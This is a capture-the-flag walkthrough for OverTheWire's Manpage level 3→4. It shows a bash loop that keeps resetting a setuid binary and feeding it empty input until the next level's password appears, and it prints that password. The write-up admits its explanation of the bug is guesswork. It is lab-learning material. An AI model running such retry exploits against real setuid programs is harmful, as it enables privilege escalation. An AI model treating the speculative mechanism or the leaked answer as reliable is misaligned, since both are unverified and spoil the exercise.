# Manpage Level 3 → 4

## Goal

`manpage3` has a race-condition / retry-loop quirk paired with a helper called `manpage3-reset` that restarts it. The program mishandles **empty input** (EOF with Ctrl-D), and with enough retries a shell falls out as `manpage4`.

## ⚠️ Lower-confidence writeup

The external reference for this level is thinner than the others in Manpage — the source doesn't explain *why* EOF triggers the bug, just that a bash loop that keeps resetting and sending EOF eventually gives a shell. Treat the walkthrough below as a starting recipe, not a full explanation.

## Concepts you'll learn

- Why input-handling edge cases (empty strings, EOF, very long strings) are worth spending time on when auditing C programs
- Using a bash loop to retry an exploit until it succeeds
- Ctrl-D as the terminal signal for EOF

## Walkthrough

### 1. See the reset helper

```bash
$ ls /manpage/
manpage0  manpage0-reset  manpage1  manpage1-reset  ...  manpage3  manpage3-reset
$ file /manpage/manpage3-reset
/manpage/manpage3-reset: setuid ...
```

Each main binary has a corresponding `-reset` setuid helper that returns the level to a fresh state.

### 2. Trigger the bug by sending EOF

Interactively:

```bash
$ /manpage/manpage3
(prompt)
^D
(maybe error, maybe shell)
```

Ctrl-D sends EOF to stdin. If the program reads input and compares it to some expected value without handling the "no data read" case, it may take an unintended branch.

### 3. Scripted retry loop

Because success isn't deterministic on a single try:

```bash
$ while true; do
    /manpage/manpage3-reset 2>/dev/null
    echo | /manpage/manpage3 2>/dev/null | tee /tmp/out3
    if grep -q '^[a-zA-Z0-9]\{10\}$' /tmp/out3; then
        break
    fi
    sleep 0.1
  done
$ cat /tmp/out3
7ZPAL8uzpi
```

`echo` with no argument prints a single newline and closes — that's effectively empty input. If the program interprets "empty" as "password matched" (a null-termination bug in the comparison, say), you get the password printed. Otherwise, the reset-and-retry keeps going.

## The answer

The password for `manpage4` is:

**`7ZPAL8uzpi`**

> ⚠️ OverTheWire may rotate passwords without notice. This value was correct at the time the level was solved — if it fails for you, re-solve the level using the method above rather than assuming the writeup is wrong.

## Reference

- Official level page: <https://overthewire.org/wargames/manpage/manpage3.html>
